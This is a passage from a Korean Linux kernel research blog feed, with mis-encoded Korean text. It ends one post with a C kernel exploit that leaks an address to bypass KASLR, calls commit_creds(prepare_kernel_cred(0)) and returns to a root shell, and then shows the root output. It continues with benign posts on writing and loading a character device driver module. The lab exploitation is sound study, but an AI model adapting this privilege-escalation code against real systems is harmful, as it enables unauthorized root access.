ê³¼ì •ì„ ëª¨ë‘ í¬í•¨í•˜ì—¬ ì‘ì„±í•œ ìµìŠ¤í”Œë¡œì‡ì€ ë‹¤ìŒê³¼ ê°™ë‹¤.</p></br><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br>unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);<br>unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);<br><br>struct register_val &#123;<br>    uint64_t user_rip;<br>    uint64_t user_cs;<br>    uint64_t user_rflags;<br>    uint64_t user_rsp;<br>    uint64_t user_ss;<br>&#125; __attribute__((packed));<br><br>struct register_val rv;<br><br>void shell(void) &#123;<br>    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);<br>&#125;<br><br>void backup_rv(void) &#123;<br>    asm(&quot;mov rv+8, cs;&quot;<br>        &quot;pushf; pop rv+16;&quot;<br>        &quot;mov rv+24, rsp;&quot;<br>        &quot;mov rv+32, ss;&quot;<br>       );<br>    rv.user_rip = &amp;shell;<br>&#125;<br><br>void payload(void) &#123;<br>    commit_creds(prepare_kernel_cred(0));<br>    asm(&quot;swapgs;&quot;<br>        &quot;mov %%rsp, %0;&quot;<br>        &quot;iretq;&quot;<br>        : : &quot;r&quot; (&amp;rv));<br>&#125;<br><br>int main() &#123;<br>    int fd;<br>    void *ptr = 0;<br>    void *leak = 0;<br>    void *kbase = 0;<br>    <br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br>    read(fd, &amp;leak, 0);<br>    printf(&quot;leak : %p\n&quot;, leak);<br>    <br>    kbase = leak - 0xbedb9;<br>    commit_creds = kbase + 0x8e9f0;<br>    prepare_kernel_cred = kbase + 0x8ec20;<br><br>    ptr = &amp;payload;<br><br>    backup_rv();<br><br>    write(fd, &amp;ptr, sizeof(ptr));<br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure></br><h3 id="ê³µê²©ê²°ê³¼"><a href="#ê³µê²©ê²°ê³¼" class="headerlink" title="ê³µê²©ê²°ê³¼"></a>ê³µê²©ê²°ê³¼</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]/ $ whoamiuser/ $ ./exploit leak : 0xffffffffb5ebedb9/ # whoamiroot/ # </code></pre></br><h2 id="ì°¸ê³ "><a href="#ì°¸ê³ " class="headerlink" title="ì°¸ê³ "></a>ì°¸ê³ </h2><pre><code>b30w0lfë‹˜ì˜ ìš´ì˜ì²´ì œ(Operating System)DREAMHACK - Linux Kernel ExploitINFLEARN - ë¦¬ëˆ…ìŠ¤ ì»¤ë„ í•´í‚¹. Aë¶€í„° Zê¹Œì§€</code></pre><h2 id="í•œì¤„í‰"><a href="#í•œì¤„í‰" class="headerlink" title="í•œì¤„í‰"></a>í•œì¤„í‰</h2><pre><code>ê³¼ì—° ì´ëŸ¬í•œ ê³µê²©ì„ ë§‰ì„ ìˆ˜ ìˆëŠ” ë°©ë²•ì€ ë¬´ì—‡ì¼ê¹Œ ê³ ë¯¼í•´ë³´ì</code></pre>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exploit</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>mitigation</tag>
      
      <tag>kaslr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Linux Kernel Basic - (7) ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„(Device Driver) 2í¸</title>
    <link href="/2021/09/09/LinuxKernelBasic7/"/>
    <url>/2021/09/09/LinuxKernelBasic7/</url>
    
    <content type="html"><![CDATA[<h2 id="Research-Linux-Kernel-Basic-7-ë””ë°”ì´ìŠ¤-ë“œë¼ì´ë²„-Device-Driver-2í¸"><a href="#Research-Linux-Kernel-Basic-7-ë””ë°”ì´ìŠ¤-ë“œë¼ì´ë²„-Device-Driver-2í¸" class="headerlink" title="[Research] Linux Kernel Basic - (7) ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„(Device Driver) 2í¸"></a>[Research] Linux Kernel Basic - (7) ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„(Device Driver) 2í¸</h2><p><img src="/img/penguinshot.png"></p></br><h2 id="ì„œë¡ "><a href="#ì„œë¡ " class="headerlink" title="ì„œë¡ "></a>ì„œë¡ </h2><p>ì§€ë‚œ í¬ìŠ¤íŠ¸ì—ì„œëŠ” ì»¤ë„ì˜ ì¢…ë¥˜ì¸ ëª¨ë†€ë¦¬ì‹ ì»¤ë„ê³¼ ë§ˆì´í¬ë¡œ ì»¤ë„ì„ ì•Œì•„ë³´ì•˜ìœ¼ë©° ì ì¬ ê°€ëŠ¥ ëª¨ë“ˆ(LKM)ì´ ì–´ë– í•œ ê²ƒ ì¸ì§€, ì ì¬ ê°€ëŠ¥ ëª¨ë“ˆ(LKM)ìœ¼ë¡œ ì‚¬ìš©ë˜ëŠ” ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ì— ëŒ€í•´ ì–¸ê¸‰í•˜ì˜€ë‹¤. í•´ë‹¹ í¬ìŠ¤íŠ¸ì—ì„œëŠ” ìºë¦­í„° ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„(Character Device Driver)ë¥¼ ì§ì ‘ êµ¬í˜„í•´ë³´ë©° ì—°êµ¬í•œ ê²ƒì„ í† ëŒ€ë¡œ í¬ìŠ¤íŠ¸ë¥¼ ì‘ì„±í•˜ê² ë‹¤.</p></br><h2 id="ë””ë°”ì´ìŠ¤-ë“œë¼ì´ë²„"><a href="#ë””ë°”ì´ìŠ¤-ë“œë¼ì´ë²„" class="headerlink" title="ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„"></a>ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„</h2><p><img src="/img/device_driver_graph.PNG"></p><p>ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ì˜ ê²½ìš° ë””ë°”ì´ìŠ¤ ìì²´ì— ëŒ€í•œ ì •ë³´ë¥¼ ì„¸ë¶€ì ìœ¼ë¡œ ì•Œ í•„ìš”ê°€ ì—†ìœ¼ë©° ê°€ìƒíŒŒì¼ì‹œìŠ¤í…œ(VFS)ì„ ì´ìš©í•˜ì—¬ íŒŒì¼ì— ëŒ€í•œ ì ‘ê·¼ì„ í†µí•´ ë””ë°”ì´ìŠ¤ë¥¼ ì œì–´í•  ìˆ˜ ìˆë‹¤. í•´ë‹¹ ë§ì„ ì¼ë°˜ì ìœ¼ë¡œ í’€ì–´ë‚´ë©´ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ì˜ ê²½ìš° ì¶”ìƒí™”ëœ ì¥ì¹˜ì— ì ‘ê·¼í•˜ì—¬ ì •í˜•í™” ëœ ì¸í„°í˜ì´ìŠ¤(open, read, write)ê³¼ ê°™ì€ í˜•íƒœë¡œ ì ‘ê·¼ì´ ê°€ëŠ¥í•˜ë‹¤ëŠ” ë§ì´ë‹¤.</p><h3 id="User-Application-ì¸¡ë©´"><a href="#User-Application-ì¸¡ë©´" class="headerlink" title="User Application ì¸¡ë©´"></a>User Application ì¸¡ë©´</h3><ul><li>í•˜ë“œì›¨ì–´ ì¥ì¹˜, ì¦‰ ë””ë°”ì´ìŠ¤ì˜ ê²½ìš° í•˜ë‚˜ì˜ íŒŒì¼ë¡œ ì¸ì‹í•  ìˆ˜ ìˆë‹¤.</li><li>ì •í˜•í™”ëœ ì¸í„°í˜ì´ìŠ¤ ì‹œìŠ¤í…œ í˜¸ì¶œì„ í†µí•´ ì‹¤ì œ í•˜ë“œì›¨ì–´ ì¥ì¹˜ì— ëŒ€í•œ ì ‘ê·¼/ì œì–´ê°€ ê°€ëŠ¥í•˜ë‹¤.</li></ul><h3 id="Operating-System-ì¸¡ë©´"><a href="#Operating-System-ì¸¡ë©´" class="headerlink" title="Operating System ì¸¡ë©´"></a>Operating System ì¸¡ë©´</h3><ul><li>ë¦¬ëˆ…ìŠ¤ì—ì„œ ë””ë°”ì´ìŠ¤ëŠ” íŒŒì¼ë¡œ ì·¨ê¸‰ë˜ë©° ì•¡ì„¸ìŠ¤ê°€ ê°€ëŠ¥í•˜ë‹¤.</li><li>íŒŒì¼ë¡œ ì·¨ê¸‰ë˜ë¯€ë¡œ ì •ì˜ëœ file operationì„ ê¸°ì¤€ìœ¼ë¡œ ì ‘ê·¼/ì œì–´ê°€ ê°€ëŠ¥í•˜ë‹¤.</li><li>ê°ê°ì˜ ë””ë°”ì´ìŠ¤ëŠ” ë””ë°”ì´ìŠ¤ë¥¼ ì‹ë³„í•˜ê¸° ìœ„í•œ Major Numberì™€ Minor Numberë¥¼ ê°€ì§€ê³  ìˆë‹¤.</li></ul><h3 id="Major-Number-amp-Minor-Number"><a href="#Major-Number-amp-Minor-Number" class="headerlink" title="Major Number &amp; Minor Number"></a>Major Number &amp; Minor Number</h3><pre><code>$ ls -al /dev/*crw-rw----   1 root tty       7,   0 Sep  5 17:33 vcscrw-rw----   1 root tty       7,   1 Sep  5 17:33 vcs1crw-rw----   1 root tty       7,   2 Sep  5 17:33 vcs2crw-rw----   1 root tty       7,   3 Sep  5 17:33 vcs3crw-rw----   1 root tty       7,   4 Sep  5 17:33 vcs4crw-rw----   1 root tty       7,   5 Sep  5 17:33 vcs5crw-rw----   1 root tty       7,   6 Sep  5 17:33 vcs6.</code></pre><p>Major Number(ì£¼ë²ˆí˜¸)ì˜ ê²½ìš°ëŠ” ì»¤ë„ì—ì„œ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ë¥¼ êµ¬ë¶„/ì—°ê²°í•˜ëŠ” ìš©ë„ë¡œ ì‚¬ìš©ë˜ë©° ê°™ì€ ë””ë°”ì´ìŠ¤ ì¢…ë¥˜ë¥¼ ì§€ì¹­í•œë‹¤. 1byteë¡œ êµ¬ì„±ëœë‹¤. Minor Number(ë¶€ë²ˆí˜¸)ì˜ ê²½ìš°ëŠ” ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ ë‚´ì— ì¥ì¹˜ë¥¼ êµ¬ë¶„í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë˜ë©° ê° ë””ë°”ì´ìŠ¤ì˜ ë¶€ê°€ì ì¸ ì •ë³´ë¥¼ ë‚˜íƒ€ë‚´ë©° 2byteë¡œ êµ¬ì„±ëœë‹¤. ì´ë¥¼ í†µí•´ í•˜ë‚˜ì˜ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ê°€ ì—¬ëŸ¬ ê°œì˜ ë””ë°”ì´ìŠ¤ë¥¼ ì œì–´ ê°€ëŠ¥í•˜ë‹¤.</p></br><h2 id="ëª¨ë“ˆ-í”„ë¡œê·¸ë˜ë°"><a href="#ëª¨ë“ˆ-í”„ë¡œê·¸ë˜ë°" class="headerlink" title="ëª¨ë“ˆ í”„ë¡œê·¸ë˜ë°"></a>ëª¨ë“ˆ í”„ë¡œê·¸ë˜ë°</h2><h3 id="chardev-c"><a href="#chardev-c" class="headerlink" title="chardev.c"></a>chardev.c</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">// source: chardev.c<br>#include &lt;linux/init.h&gt;<br>#include &lt;linux/module.h&gt;<br>#include &lt;linux/kernel.h&gt;<br><br>MODULE_AUTHOR(&quot;G4EG4EG4E&quot;);<br>MODULE_DESCRIPTION(&quot;sample character device driver.&quot;);<br>MODULE_LICENSE(&quot;Dual BSD/GPL&quot;);<br><br>static int __init custom_init(void) &#123;<br>    printk(&quot;[+] Init Custom Device\n&quot;);<br><br>    return 0;<br><br>&#125;<br><br>static void __exit custom_exit(void) &#123;<br>    printk(&quot;[-] Exit Custom Device\n&quot;);<br>&#125;<br><br><br>module_init(custom_init);<br>module_exit(custom_exit);<br><br></code></pre></td></tr></table></figure><p>ë‹¤ìŒê³¼ ê°™ì€ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ ëª¨ë“ˆì„ ì‘ì„±í•˜ì˜€ë‹¤. module_initì˜ ê²½ìš°ëŠ” í•´ë‹¹ ëª¨ë“ˆì´ ë“±ë¡ë  ê²½ìš° ì‹¤í–‰ë˜ëŠ” í•¨ìˆ˜ì´ë©°, module_exitì˜ ê²½ìš°ëŠ” í•´ë‹¹ ëª¨ë“ˆì´ í•´ì œë  ê²½ìš° ì‹¤í–‰ë˜ëŠ” í•¨ìˆ˜ì´ë‹¤.</p></br><h3 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs makefile">obj-m += chardev.o<br>PWD := <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span><br><br>KDIR:=/lib/modules/<span class="hljs-variable">$(<span class="hljs-built_in">shell</span> uname -r)</span>/build<br><br><span class="hljs-section">all:</span><br><span class="hljs-variable">$(MAKE)</span> -C <span class="hljs-variable">$(KDIR)</span> M=<span class="hljs-variable">$(PWD)</span> modules<br><br><span class="hljs-section">clean:</span><br><span class="hljs-variable">$(MAKE)</span> -C <span class="hljs-variable">$(KDIR)</span> M=<span class="hljs-variable">$(PWD)</span> clean<br></code></pre></td></tr></table></figure><p>ëª¨ë“ˆì˜ ì†ŒìŠ¤ì½”ë“œë¥¼ ì»´íŒŒì¼í•˜ê¸° ìœ„í•´ì„œëŠ” Makefileì„ ì‘ì„±í•´ì•¼ í•œë‹¤. ì»¤ë„ ë²„ì „ê³¼ ë™ì¼í•œ í˜•íƒœë¡œ ë¹Œë“œë¥¼ ì§„í–‰í•´ì•¼ í•´ë‹¹ ì‹œìŠ¤í…œì—ì„œ ë™ì ìœ¼ë¡œ ë¡œë“œí•  ìˆ˜ ìˆëŠ” ëª¨ë“ˆì´ ëœë‹¤. ì»´íŒŒì¼ì´ ì •ìƒì ìœ¼ë¡œ ë  ê²½ìš° chardev.ko ë°”ì´ë„ˆë¦¬ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìœ¼ë©° í•´ë‹¹ ë°”ì´ë„ˆë¦¬ê°€ LKMì´ë‹¤.</p></br><h3 id="ì»¤ë„-ëª¨ë“ˆì˜-ë“±ë¡ê³¼-í•´ì œ"><a href="#ì»¤ë„-ëª¨ë“ˆì˜-ë“±ë¡ê³¼-í•´ì œ" class="headerlink" title="ì»¤ë„ ëª¨ë“ˆì˜ ë“±ë¡ê³¼ í•´ì œ"></a>ì»¤ë„ ëª¨ë“ˆì˜ ë“±ë¡ê³¼ í•´ì œ</h3><pre><code>$ sudo insmod chardev.ko$ dmesg [301222.511894] atkbd serio0: Unknown key released (translated set 2, code 0x72 on isa0060/serio0).[301222.511896] atkbd serio0: Use &#39;setkeycodes 72 &lt;keycode&gt;&#39; to make it known.[301226.623243] atkbd serio0: Unknown key pressed (translated set 2, code 0x72 on isa0060/serio0).[301226.623250] atkbd serio0: Use &#39;setkeycodes 72 &lt;keycode&gt;&#39; to make it known.[301226.623564] atkbd serio0: Unknown key released (translated set 2, code 0x72 on isa0060/serio0).[301226.623566] atkbd serio0: Use &#39;setkeycodes 72 &lt;keycode&gt;&#39; to make it known.[301300.320388] [+] Init Custom Device.</code></pre><p>insmod ëª…ë ¹ì–´ë¥¼ í†µí•´ í•´ë‹¹ ì»¤ë„ ëª¨ë“ˆì„ ë“±ë¡í•  ê²½ìš° custom_init í•¨ìˆ˜ê°€ ì‹¤í–‰ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p></br><pre><code>$ sudo rmmod chardev$ dmesg [301222.511894] atkbd serio0: Unknown key released (translated set 2, code 0x72 on isa0060/serio0).[301222.511896] atkbd serio0: Use &#39;setkeycodes 72 &lt;keycode&gt;&#39; to make it known.[301226.623243] atkbd serio0: Unknown key pressed (translated set 2, code 0x72 on isa0060/serio0).[301226.623250] atkbd serio0: Use &#39;setkeycodes 72 &lt;keycode&gt;&#39; to make it known.[301226.623564] atkbd serio0: Unknown key released (translated set 2, code 0x72 on isa0060/serio0).[301226.623566] atkbd serio0: Use &#39;setkeycodes 72 &lt;keycode&gt;&#39; to make it known.[301300.320388] [+] Init Custom Device[301311.542920] [-] Exit Custom Device.</code></pre><p>rmmod ëª…ë ¹ì–´ë¥¼ í†µí•´ í•´ë‹¹ ì»¤ë„ ëª¨ë“ˆì„ í•´ì œí•  ê²½ìš° custom_exit í•¨ìˆ˜ê°€ ì‹¤í–‰ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p></br><h2 id="í•œì¤„í‰"><a href="#í•œì¤„í‰" class="headerlink" title="í•œì¤„í‰"></a>í•œì¤„í‰</h2><pre><code>ì•„ëª¬ë“œ ë„¥ìŠ¤íŠ¸ ë ˆë²¨ğŸ’</code></pre><br><h2 id="ì°¸ê³ "><a href="#ì°¸ê³ " class="headerlink" title="ì°¸ê³ "></a>ì°¸ê³ </h2><pre><code>b30w0lfë‹˜ì˜ ìš´ì˜ì²´ì œ(Operating System)https://butter-shower.tistory.com/29?category=715664</code></pre>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exploit</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>mitigation</tag>
      
      <tag>kaslr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Linux Kernel Basic - (6) ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„(Device Driver) 1í¸</title>
    <link href="/2021/09/08/LinuxKernelBasic6/"/>
    <url>/2021/09/08/LinuxKernelBasic6/</url>
    
    <content type="html"><![CDATA[<h2 id="Research-Linux-Kernel-Basic-6-ë””ë°”ì´ìŠ¤-ë“œë¼ì´ë²„-Device-Driver-1í¸"><a href="#Research-Linux-Kernel-Basic-6-ë””ë°”ì´ìŠ¤-ë“œë¼ì´ë²„-Device-Driver-1í¸" class="headerlink" title="[Research] Linux Kernel Basic - (6) ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„(Device Driver) 1í¸"></a>[Research] Linux Kernel Basic - (6) ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„(Device Driver) 1í¸</h2><p><img src="/img/penguinshot.png"></p></br><h2 id="ì„œë¡ "><a href="#ì„œë¡ " class="headerlink" title="ì„œë¡ "></a>ì„œë¡ </h2><p>í•´ë‹¹ í¬ìŠ¤íŠ¸ì—ì„œëŠ” ëª¨ë†€ë¦¬ì‹ ì»¤ë„ê³¼ ë§ˆì´í¬ë¡œ ì»¤ë„ì„ ì•Œì•„ë³´ê³  ë¦¬ëˆ…ìŠ¤ ì»¤ë„(Linux Kernel)ì€ ì–´ë– í•œ íŠ¹ì„±ì„ ì§€ë‹ˆë©° ë¦¬ëˆ…ìŠ¤ ì»¤ë„ ëª¨ë“ˆ(LKM)ì— ëŒ€í•œ ì„¤ëª…ì„ ì§„í–‰í•˜ë©° ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ë¥¼ ì§ì ‘ ê°œë°œí•˜ì—¬ ì§ì ‘ ì»¤ë„ì— íƒ‘ì¬í•´ë³´ëŠ” ì—°êµ¬ë¥¼ ì§„í–‰í•˜ë©° ì–»ì€ ê²°ê³¼ì— ëŒ€í•œ í¬ìŠ¤íŒ…ì„ ì§„í–‰í•˜ê² ë‹¤.</p></br><h2 id="ëª¨ë†€ë¦¬ì‹-ì»¤ë„ê³¼-ë§ˆì´í¬ë¡œ-ì»¤ë„"><a href="#ëª¨ë†€ë¦¬ì‹-ì»¤ë„ê³¼-ë§ˆì´í¬ë¡œ-ì»¤ë„" class="headerlink" title="ëª¨ë†€ë¦¬ì‹ ì»¤ë„ê³¼ ë§ˆì´í¬ë¡œ ì»¤ë„"></a>ëª¨ë†€ë¦¬ì‹ ì»¤ë„ê³¼ ë§ˆì´í¬ë¡œ ì»¤ë„</h2><p><img src="/img/kernel.png" alt="ì»¤ë„ì˜ ì¢…ë¥˜"></p><p>ì»¤ë„ì´ë€ ìš´ì˜ì²´ì œì˜ í•µì‹¬ì´ ë˜ëŠ” ì†Œí”„íŠ¸ì›¨ì–´ì´ë©° ë©”ì¸ ë©”ëª¨ë¦¬ì— ìƒì£¼í•˜ì—¬ ì‹œìŠ¤í…œì˜ ì¡´ì¬í•˜ëŠ” ìì›ì„ íš¨ìœ¨ì ìœ¼ë¡œ ê´€ë¦¬í•˜ëŠ” ì—­í• ì„ í•œë‹¤ëŠ” ì´ì•¼ê¸°ë¥¼ ì–¸ê¸‰í•˜ì˜€ë‹¤. ì˜ˆë¥¼ ë“¤ì–´ í”„ë¡œì„¸ìŠ¤ì˜ ìš°ì„ ìˆœìœ„ë¥¼ í†µí•´ ì»¨í…ìŠ¤íŠ¸ ìŠ¤ìœ„ì¹­ ì‹œ ì–´ë–¤ í”„ë¡œì„¸ìŠ¤ë¥¼ ì‹¤í–‰ì‹œí‚¬ ê²ƒ ì¸ì§€ ê´€ë¦¬ë„ í•˜ë©° ê°€ìƒ ë©”ëª¨ë¦¬ë¥¼ í†µí•´ í•˜ë“œ ë””ìŠ¤í¬ì—ì„œ í”„ë¡œê·¸ë¨ì„ ë¡œë“œí•  ê²½ìš° ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•˜ê±°ë‚˜ í•˜ëŠ” ë“±ì˜ ì‚¬ìš©ìê°€ ì»´í“¨í„°ë¥¼ ì‚¬ìš©í•  ê²½ìš° ë‚´ë¶€ì ìœ¼ë¡œ í•˜ë“œì›¨ì–´ì˜ ì ‘ê·¼ì„ í†µí•´ ê²°ì •ì„ í•˜ëŠ” ë“±ì˜ ì£¼ìš” ì—­í• ì„ í•œë‹¤. </p><p>ê·¸ëŸ¬í•œ ì»¤ë„ì—ë„ í¬ê²Œ ë‘ ê°€ì§€ ì¢…ë¥˜ì˜ ì»¤ë„ì´ ìˆë‹¤ê³  ë³¼ ìˆ˜ ìˆë‹¤. <u>ëª¨ë†€ë¦¬ì‹ ì»¤ë„(Monolithic Kernel)</u>ê³¼ <u>ë§ˆì´í¬ë¡œ ì»¤ë„(Micro Kernel)</u>ì´ë‹¤. ëª¨ë†€ë¦¬ì‹ ì»¤ë„ì˜ ê²½ìš°ëŠ” ì‹œìŠ¤í…œ ê¸°ëŠ¥ì¸ (VFS, IPC, Device Driver)ë“±ê³¼ ê°™ì€ ê¸°ëŠ¥ë“¤ì„ ì»¤ë„ì´ ìˆ˜í–‰í•˜ëŠ” ì—­í• ì„ í•˜ì§€ë§Œ ë§ˆì´í¬ë¡œ ì»¤ë„(Micro Kernel)ì˜ ê²½ìš°ì—ëŠ” ìš´ì˜ì²´ì œë¡œì„œ ì§„í–‰í•´ì•¼í•˜ëŠ” í•µì‹¬ì ì¸ ê¸°ëŠ¥(ìŠ¤ì¼€ì¤„ë§, ë©”ëª¨ë¦¬ ê´€ë¦¬)ë“±ì˜ ê¸°ëŠ¥ë§Œ ì»¤ë„ì— ë‹´ì•„ ê°€ë²¼ìš´ í˜•íƒœë¡œ ë§Œë“  ì»¤ë„ì´ë‹¤. ìƒë‹¨ì˜ ê·¸ë¦¼ì„ ë³´ë©´ ê¸°ì¡´ì— ì»¤ë„ì´ ì œê³µí•´ì•¼ë§Œ í•œë‹¤ê³  ìƒê°í•˜ì˜€ë˜ File Systems, Process Serverë“±ì´ User Spaceì—ì„œ ëŒì•„ê°€ê³  ìˆìŒì„ ë³¼ ìˆ˜ ìˆë‹¤.</p><p>ê° ì»¤ë„ì˜ íŠ¹ì„±ì— ë”°ë¼ì„œ ì¥ë‹¨ì ì„ ê°€ì§€ê³  ìˆìœ¼ë©° ëª¨ë†€ë¦¬ì‹ ì»¤ë„ì— íŠ¹ì„±ìƒ ì£¼ìš” ì»´í¬ë„ŒíŠ¸ë“¤ì´ ì»¤ë„ì— ìœ„ì¹˜í•˜ê¸°ì— ì»¤ë„ ë‚´ë¶€ì˜ ìš”ì†Œë“¤ì´ ë³µí•©ì ìœ¼ë¡œ ìƒí˜¸ì‘ìš©ì„ í•˜ëŠ” ê²ƒì´ ê°„ê²°í•˜ì—¬ ë¹ ë¥´ë‹¤. í•˜ì§€ë§Œ ì£¼ìš”ê¸°ëŠ¥ì´ ì»¤ë„ì— ì¡´ì¬í•˜ì—¬ ë©”ëª¨ë¦¬ ì¶©ëŒê³¼ ê°™ì€ ì´ìŠˆê°€ ë°œìƒí•˜ë©´ ì»¤ë„ íŒ¨ë‹‰(Kernel Panic)ì´ ë°œìƒí•˜ë©° ì‹œìŠ¤í…œ ìì²´ê°€ ì¢…ë£Œëœë‹¤. ë§ˆì´í¬ë¡œ ì»¤ë„ì˜ ê²½ìš°ëŠ” í•˜ë“œì›¨ì–´ ì¢…ì†ì„±ì„ ìµœì†Œí™” ì‹œí‚¨ í˜•íƒœë¡œ í•µì‹¬ì ì¸ ê¸°ëŠ¥ë§Œì„ ì§„í–‰í•˜ê¸°ì— ì´ì‹ì„±ì´ ë†’ìœ¼ë©° ìƒˆë¡œìš´ ê¸°ëŠ¥ì„ ì¶”ê°€í•  ê²½ìš° ì„œë²„ë¥¼ ì¶”ê°€í•˜ëŠ” ë°©ì‹ìœ¼ë¡œ ì§„í–‰ë˜ê¸°ì— í™•ì¥ì„±ì´ ì¢‹ë‹¤. í•˜ì§€ë§Œ ì„œë¡œ ë‹¤ë¥¸ ì˜ì—­ì¸ User Modeì™€ Kernel Modeì˜ ë¹ˆë²ˆí•œ ì „í™˜(Context Swithcing)ì´ ë°œìƒí•˜ë©° ì „ì²´ ì†ë„ë©´ì—ì„œëŠ” ì¢‹ì§€ ì•Šë‹¤ëŠ” ë‹¨ì ì´ ìˆë‹¤.</p></br><h2 id="ì ì¬-ê°€ëŠ¥-ì»¤ë„-ëª¨ë“ˆ-LKM"><a href="#ì ì¬-ê°€ëŠ¥-ì»¤ë„-ëª¨ë“ˆ-LKM" class="headerlink" title="ì ì¬ ê°€ëŠ¥ ì»¤ë„ ëª¨ë“ˆ(LKM)"></a>ì ì¬ ê°€ëŠ¥ ì»¤ë„ ëª¨ë“ˆ(LKM)</h2><p>ë¦¬ëˆ…ìŠ¤ ì»¤ë„ì€ ì•ì„œ ì´ì•¼ê¸°í•œ ì»¤ë„ ì¤‘ ëª¨ë†€ë¦¬ì‹ ì»¤ë„(Monolithic Kernel)ì´ë‹¤. ì¼ë°˜ì ìœ¼ë¡œ ëª¨ë†€ë¦¬ì‹ ì»¤ë„ì˜ ë‹¨ì ì€ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ì™€ ê°™ì€ ì»¤ë„ ëª¨ë“ˆì„ ì¶”ê°€/ì‚­ì œí•˜ê¸° ìœ„í•´ì„œëŠ” ì»¤ë„ì„ ì¬ë¹Œë“œ í•´ì•¼ í•œë‹¤ê³  í•œë‹¤. í•˜ì§€ë§Œ ë‹¤ìŒê³¼ ê°™ì€ ê²½ìš°ì—ëŠ” ì–¼ë§ˆë‚˜ í° 